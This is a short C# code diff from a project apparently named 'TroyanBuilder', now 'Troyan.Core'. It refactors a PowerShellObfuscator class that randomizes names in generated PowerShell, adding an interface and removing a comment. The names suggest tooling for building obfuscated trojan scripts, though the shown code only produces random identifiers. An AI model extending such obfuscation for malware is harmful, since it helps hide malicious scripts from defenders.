@@ -1,9 +1,9 @@
 using System.Text;
 
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 /// <summary>Lightweight name / snippet randomization for generated PowerShell.</summary>
-public sealed class PowerShellObfuscator
+public sealed class PowerShellObfuscator : IPowerShellObfuscator
 {
     private static readonly Random Shared = new();
 
@@ -17,6 +17,5 @@ public sealed class PowerShellObfuscator
         return sb.ToString();
     }
 
-    /// <summary>Placeholder segment for holder sources (replaces <c>###random</c>).</summary>
     public string RandomCode() => GenerateRandomName();
 }
